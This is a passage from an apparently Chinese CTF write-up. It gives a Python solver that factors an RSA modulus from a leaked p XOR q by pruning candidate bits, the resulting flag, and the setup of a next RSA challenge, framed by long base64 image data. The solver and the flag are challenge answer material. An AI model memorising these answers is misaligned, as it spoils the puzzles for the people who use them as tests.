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" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#!python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Time    : 2024/6/27 10:08</span><br><span class="line"># @Author  : 3tefanie</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">import gmpy2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def find_pq(bin_p, bin_q):</span><br><span class="line">    l = len(bin_p)</span><br><span class="line">    if l == 512:</span><br><span class="line">        p = int(bin_p, 2)</span><br><span class="line">        if n % p == 0:</span><br><span class="line">            q = n//p</span><br><span class="line">            phi = (p-1)*(q-1)</span><br><span class="line">            d = gmpy2.invert(e,phi)</span><br><span class="line">            m = pow(c,d,n)</span><br><span class="line">            flag = long_to_bytes(m)</span><br><span class="line">            print(flag)</span><br><span class="line">    else:</span><br><span class="line">        p = int(bin_p, 2)</span><br><span class="line">        q = int(bin_q, 2)</span><br><span class="line">        if (p ^ q) % (2 ** l) == p_xor_q % (2 ** l) and p * q % (2 ** l) == n % (2 ** l):</span><br><span class="line">            find_pq(&#x27;1&#x27; + bin_p, &#x27;1&#x27; + bin_q)</span><br><span class="line">            find_pq(&#x27;1&#x27; + bin_p, &#x27;0&#x27; + bin_q)</span><br><span class="line">            find_pq(&#x27;0&#x27; + bin_p, &#x27;1&#x27; + bin_q)</span><br><span class="line">            find_pq(&#x27;0&#x27; + bin_p, &#x27;0&#x27; + bin_q)</span><br><span class="line"></span><br><span class="line">n = 145462084881728813723574366340552281785604069047381248513937024180816353963950721541845665931261230969450819680771925091152670386983240444354412170994932196142227905635227116456476835756039585419001941477905953429642459464112871080459522266599791339252614674500304621383776590313803782107531212756620796159703</span><br><span class="line">e = 10463348796391625387419351013660920157452350067191419373870543363741187885528042168135531161031114295856009050029737547684735896660393845515549071092389128688718675573348847489182651631515852744312955427364280891600765444324519789452014742590962030936762237037273839906251320666705879080373711858513235704113</span><br><span class="line">c = 60700608730139668338977678601901211800978306010063875269252006068222163102100346920465298044880066999492746508990629867396189713753873657197546664480233269806308415874191048149900822050054539774370134460339681949131037133783273410066318511508768512778132786573893529705068680583697574367357381635982316477364</span><br><span class="line">leak1 = 13342820281239625174817085182586822673810894195223942279061039858850534510679297962596800315875604798047264337469828123370586584840078728059729121435462780</span><br><span class="line">leak2 = 10901899434728393473569359914062349292412269512201554924835672710780580634465799069211035290729536290605761024818770843901501694556825737462457471235151530</span><br><span class="line">p_xor_q = leak1^leak2</span><br><span class="line">find_pq(&#x27;1&#x27;, &#x27;1&#x27;)</span><br><span class="line">```</span><br><span class="line">flag:</span><br><span class="line">```python</span><br><span class="line">cftshow&#123;do_you_know_what_is_xor_and_prune!!!&#125;</span><br><span class="line">```</span><br></pre></td></tr></table></figure><h3 id="4-给你d又怎样"><a href="#4-给你d又怎样" class="headerlink" title="4 给你d又怎样"></a><strong>4 给你d又怎样</strong></h3><p>题目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from gmpy2 import *</span><br><span class="line"></span><br><span class="line">flag=&quot;ctfshow&#123;***&#125;&quot;</span><br><span class="line">m=bytes_to_long(flag.encode())</span><br><span class="line">e=65537</span><br><span class="line">p=getPrime(128)</span><br><span class="line">q=getPrime(128)</span><br><span class="line">n=p*q</span><br><span class="line">phin=(p-1)*(q-1)</span><br><span class="line">d=invert(e,phin)</span><br><span class="line">c=pow(m,e,n)</span><br><span class="line">print(&quot;c=&quot;,c)</span><br><span class="line">print(&quot;hint=&quot;,pow(n,e,c))</span><br><span class="line">print(&quot;e=&quot;,e)</span><br><span class="line">print(&quot;d=&quot;,d)</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">c= 48794779998818255539069127767619606491113391594501378173579539128476862598083</span><br><span class="line">hint= 7680157534215495795423318554486996424970862185001934572714615456147511225105</span><br><span class="line">e= 65537</span><br><span class="line">d= 45673813678816865674850575264609274229013439838298838024467777157494920800897</span><br><span class="line">&quot;&quot;&quot;</span><br></pre></td></tr></table></figure><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAw8AAADbCAIAAACk+TolAAAgAElEQVR4Ae29B3xUVfr/P5n0Sgok9N57bypKUxERFLH33nv5rsquu/L/r67rWte1r4sFRQUEQelVOoL0DqGEkoT03n7v5MLlOjMZktAmmc/svuK555x7znPed8j55Hmee69PSUmJTR8REAEREAEREAEREIFyCNjLqVe1CIiACIiACIiACIhAKQG/KmAoKCiowlk6RQREQAREQATOLAF/f/8zO6BGEwGXBCrhW8rLyysuLnY5iipFQAREQARE4LwQYGNiezovU2tS7yHgo7wl77nYWqkIiIAIiIAIiEAVCFTCt1SF0XWKCIiACIiACIiACFR3AqdWS/JwVvdrLPtFQAREwEsIaMPykgt97pd5arWkHLpzf1U0owiIgAiIQBUI+PlV5dalKkykU7yNgPKWvO2Ka70iIAIiIAIiIAKVI3AK3xIPC9DzAipHVL1FQAREQATOEwHtWecJfM2f9hRqqeYD0ApFQAREQAREQAREwC0BqSW3eNQoAiIgAiIgAiLg9QSklrz+KyAAIiACIiACIiACbglILbnFo0YREAEREAEREAGvJyC15PVfAQEQAREQAREQARFwS0BqyS0eNYqACIiACIiACHg9Aaklr/8KCIAIiIAIiIAIiIBbAlJLbvGoUQREQAREQAREwOsJSC15/VdAAERABERABERABNwSkFpyi0eNIiACIiACIiACXk9AasnrvwICIAIiIAIiIAIi4JaA1JJbPGoUAREQAREQARHwegJSS17/FRAAERABERABERABtwSkltziUaMIiIAIiIAIiIDXE5Ba8vqvgACIgAiIgAiIgAi4JSC15BaPGkVABERABERABLyegNSS138FBEAEREAEREAERMAtAaklt3jUKAIiIAIiIAIi4PUEpJa8/isgACIgAiIgAiIgAm4JSC25xaNGERABERABERABrycgteT1XwEBEAEREAEREAERcEtAasktHjWKgAiIgAiIgAh4PQGpJa//CgiACIiACIiACIiAWwJSS27xqFEEREAEREAERMDrCUgtef1XQABEQAREQAREQATcEpBacotHjSIgAiIgAiIgAl5PQGrJ678CAiACIiACIiACIuCWgNSSWzxqFAEREAEREAER8HoCUkte/xUQABEQAREQAREQAbcEpJbc4lGjCIiACIiACIiA1xOQWvL6r4AAiIAIiIAIiIAIuCUgteQWjxpFQAREQAREQAS8noDUktd/BQRABERABERABETALQGpJbd41CgCIiACIiACIuD1BKSWvP4rIAAiIAIiIAIiIAJuCUgtucWjRhEQAREQAREQAa8nILXk9V8BARABERABERABEXBLQGrJLR41ioAIiEAlCWzatCk1NbWSJ6m7CIiARxOQWvLoyyPjREAEqh2BhQsXJicnVzuzZbAIiIAbAn5u2tQkAiIgAp5PIC8vb/fu3cXFxa1bt87MzIyPjw8MDGzWrFlQUNAZND43N/fo0aNJSUmRkZGNGzf28yv3l2dhYWFF5s3OzsbUgoKCRo0a+fj4hIWFuRmzIgOqjwiIwNkjUO4/+LM3pUYWAREQgTNFoKSk5LfffltX9rnggguQIFFRUdu2bevSpcvIkSMdZkHHZGRkOFRaD0NCQlBa1hqjfOTIkQkTJiBoWrVqtXz58kGDBrVt29a5W8VrCNWNHz+e6erVq7dkyRIO77zzTsoVH0E9RUAEziUBqaVzSVtziYAInGEC+GbIExoyZMgPP/yAe+mll16qX7/+119//eOPP/bv379OnTrW+fAPTZ8+fefOnWYlTh273V6rVi2jJi4uDo3l4JRCYL399tsxMTHXXXfdvn37Fi9e3K5du9NRS4i2N954g5/PPPMMnqq//OUvhw4dcqnSTDtVEAEROL8EpJbOL3/NLgIicFoE0Do9evTw9fUNDg6+/vrrmzRpwnD79++nBs+Nw9A4h2655RaHylMezp49e+PGje+++25ERARRs2effbZDhw7Ws+bOnYvcwcuF9uLnhg0bKODiMmrQQxdeeCE/zVNwhK1Zs4ZxUGD5+fk4lmJjY6Ojo80OKoiACHgaAaklT7siskcERKASBMj16dat27x58/DN4BniTFKXEhIS2rRpExoa6jAQzifcS27yitBeaCx+miciZZYuXYonqWHDhlTiherevbvZahTIl0JImZXEARFVDRo0MGqQaFbdhg0zZsxgHCykA6lLpEMNHTqUejQWH3McFURABDyHgNSS51wLWSICIlAVAqgfvDVIpU6dOnE+rp1du3bdfffdFJo3b27VTOSDL1iwgJTw8qYhcnfVVVfhpjI7oL1IWkIh4awyKvEGFRUVWfugjfiYpyxbtgxLWrRoYdZYC1ibnp5eu3ZtIobUMziCrHfv3iwBTWbVVdazVBYBETi/BKSWzi9/zS4CInC6BLKysvbu3WtIJTw0SCV/f38ypqdMmYKDx6qW8D+RzOTsHDItQAM5JC0RQWvatCmCxujDXCRFMQLhP/OsShUCAgII0hErzMnJwdpp06aReoVLafXq1eUJrEqNr84iIAJng4DU0tmgqjFFQATOHYFjx44Rjxs4cCBTIjvQHAS5pk6dSoQOXWK1gxCbNX/I2lReGbF10003TZ48+YsvvmBwHEt169bt2LFjef0rUj9s2LCff/75q6++In8cDxOSjpz0zp07W8N5FRlHfURABM4ZgdKcRDeT8UcPrfyh5qaPmkRABETgPBIgWEbqD/ndRrAMnw2em/Dw8DN4Q35aWtrWrVtxTTGLgwJzXvg777wzfPhw944ijOTWPOJxfLjPjhAhzybQb1pnmJWt0Z5VWWLqX0ECUksVBKVuIiACIlAhAmg1/E+SPhWCdaY7SS2daaIa7zgBqSV9FURABERABGoIAamlGnIhPW8ZJ2+U9TzbZJEIiIAIiIAIiIAInH8CUkvn/xrIAhEQAREQAREQAU8mILXkyVdHtomACIiACIiACJx/AlJL5/8ayAIREAEREAEREAFPJiC15MlXR7aJgAiIgAiIgAicfwJSS+f/GsgCERABERABERABTyYgteTJV0e2iYAIiIAIiIAInH8CUkvn/xrIAhEQAREQAREQAU8mILXkyVdHtomACIjAqQnwAivjqYwuu/Lu3sLCQpdNqhQBEaggAamlCoJSNxEQAa8jkJ2dvWzZsnXr1vEyXU9e/Pz587dv316ehQcPHly5cqUEU3l8VC8CFSEgtVQRSuojAiJQFQK8LHbWrFkvvvjiG2+8cezYMechioqK2MtTUlKcm1zW0J+Py6YzW4m3ZtOmTZ999llkZOS2bdsqbuGZNcN5tCVLlrz66qtPPfWU0YTfaPHixatWrWrWrJlzZ6MmKChowYIFCKbyOqheBETglASklk6JSB1EQASqSMButzdu3Hj37t1Hjhzx9fV1HmXfvn3PPvvsrl27nJuca9BeU6dO3bp1K1LGufXM1jDXBx98EBoamp6enpubew5mrKD9vK/38OHDWGX0T0pKwrF0ww03hISEl